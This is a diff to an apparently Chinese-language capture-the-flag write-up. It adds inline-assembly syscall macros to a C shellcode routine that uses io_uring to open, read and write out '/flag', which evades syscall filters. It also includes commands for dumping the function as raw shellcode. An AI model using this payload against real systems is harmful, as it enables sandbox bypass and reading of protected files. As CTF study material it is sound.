@@ -364,8 +364,46 @@ Disassembly of section kprobe/__x64_sys_linkat:
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <unistd.h>
+/* 2 个参数：给 io_uring_setup 用 */
+#define SYSCALL2(num, a1, a2)                                         \
+({                                                                    \
+    long _ret;                                                        \
+    register long _nr  __asm__("rax") = (long)(num);                  \
+    register long _a1  __asm__("rdi") = (long)(a1);                   \
+    register long _a2  __asm__("rsi") = (long)(a2);                   \
+    __asm__ volatile (                                                \
+        "syscall"                                                     \
+        : "+r"(_nr)                                                   \
+        : "r"(_a1), "r"(_a2)                                          \
+        : "rcx", "r11", "memory"                                      \
+    );                                                                 \
+    _ret = _nr;                                                       \
+    _ret;                                                             \
+})
 
-void __attribute__((naked, noinline,no_stack_protector))  shellcode(){
+/* 6 个参数：给 io_uring_enter 用 */
+#define SYSCALL6(num, a1,a2,a3,a4,a5,a6)                              \
+({                                                                    \
+    long _ret;                                                        \
+    register long _nr  __asm__("rax") = (long)(num);                  \
+    register long _a1  __asm__("rdi") = (long)(a1);                   \
+    register long _a2  __asm__("rsi") = (long)(a2);                   \
+    register long _a3  __asm__("rdx") = (long)(a3);                   \
+    register long _a4  __asm__("r10") = (long)(a4);                   \
+    register long _a5  __asm__("r8")  = (long)(a5);                   \
+    register long _a6  __asm__("r9")  = (long)(a6);                   \
+    __asm__ volatile (                                                \
+        "syscall"                                                     \
+        : "+r"(_nr)                                                   \
+        : "r"(_a1), "r"(_a2), "r"(_a3),                               \
+          "r"(_a4), "r"(_a5), "r"(_a6)                                \
+        : "rcx", "r11", "memory"                                      \
+    );                                                                \
+    _ret = _nr;                                                       \
+    _ret;                                                             \
+})
+    
+void __attribute__((noinline,no_stack_protector))  shellcode(){
     char filename[8] = "/flag";
     unsigned entries = 16;
     unsigned char buffer[4096*2];
@@ -378,12 +416,14 @@ void __attribute__((naked, noinline,no_stack_protector))  shellcode(){
     io_uring_params.flags = IORING_SETUP_NO_MMAP;
     io_uring_params.sq_off.user_addr = sqes_base;
     io_uring_params.cq_off.user_addr = ring_base;
-    int io_uring_fd = syscall(SYS_io_uring_setup, entries, &io_uring_params);
+    //int io_uring_fd = syscall(SYS_io_uring_setup, entries, &io_uring_params);
+    int io_uring_fd= SYSCALL2(SYS_io_uring_setup, entries, &io_uring_params);
     //printf("io_uring fd: %d\n",io_uring_fd);
     //printf("sq_off_head: %x, sq_off_tail: %x. sq_off_array = %x\n",io_uring_params.sq_off.head,io_uring_params.sq_off.tail,io_uring_params.sq_off.array);
     //printf("cq_off_head: %x, cq_off_tail: %x, cq_off_cqes = %x\n",io_uring_params.cq_off.head,io_uring_params.cq_off.tail,io_uring_params.cq_off.cqes);
     
     // open file 
+    long ret;
     struct io_uring_sqe sqe ={0};
     sqe.opcode = IORING_OP_OPENAT;
     sqe.fd = AT_FDCWD;
@@ -394,7 +434,7 @@ void __attribute__((naked, noinline,no_stack_protector))  shellcode(){
     sqes[0]= sqe; //push sqe into sqes
     ((int *)(ring_base+io_uring_params.sq_off.array))[0] = 0; //push sqes_index into sqe_array
     (*(int*)(ring_base+io_uring_params.sq_off.tail))++;//mod tail
-    syscall(SYS_io_uring_enter,io_uring_fd,1,1,IORING_ENTER_GETEVENTS,NULL,0);
+    SYSCALL6(SYS_io_uring_enter,io_uring_fd,1,1,IORING_ENTER_GETEVENTS,NULL,0);
 
     struct io_uring_cqe *  cqe = (void *)(ring_base + io_uring_params.cq_off.cqes);
     int open_fd = (int)cqe->res;
@@ -412,7 +452,7 @@ void __attribute__((naked, noinline,no_stack_protector))  shellcode(){
     sqes[0]= sqe2; //push sqe into sqes
     ((int *)(ring_base+io_uring_params.sq_off.array))[0] = 0; //push sqes_index into sqe_array
     (*(int*)(ring_base+io_uring_params.sq_off.tail))++;//mod tail
-    syscall(SYS_io_uring_enter,io_uring_fd,1,1,IORING_ENTER_GETEVENTS,NULL,0);
+    SYSCALL6(SYS_io_uring_enter,io_uring_fd,1,1,IORING_ENTER_GETEVENTS,NULL,0);
     (*(int *)(ring_base+io_uring_params.cq_off.head))++;
 
     //write file
@@ -425,7 +465,7 @@ void __attribute__((naked, noinline,no_stack_protector))  shellcode(){
     sqes[0]= sqe3; //push sqe into sqes
     ((int *)(ring_base+io_uring_params.sq_off.array))[0] = 0; //push sqes_index into sqe_array
     (*(int*)(ring_base+io_uring_params.sq_off.tail))++;//mod tail
-    syscall(SYS_io_uring_enter,io_uring_fd,1,1,IORING_ENTER_GETEVENTS,NULL,0);
+    SYSCALL6(SYS_io_uring_enter,io_uring_fd,1,1,IORING_ENTER_GETEVENTS,NULL,0);
     (*(int *)(ring_base+io_uring_params.cq_off.head))++;
 }
 
@@ -442,7 +482,8 @@ int main(){
 把shellcode函数dump出来用即可。<br>
 ```
 objdump -M intel -d --disassemble=shellcode a.out
-
+# gdb
+dump binary memory shellcode.bin xxx xxx
 ```
 参考[https://idocdown.com/app/articles/blogs/detail/10310](https://idocdown.com/app/articles/blogs/detail/10310)<br>
 [一文详细讲解 io_uring](https://zhuanlan.zhihu.com/p/582562402)<br>
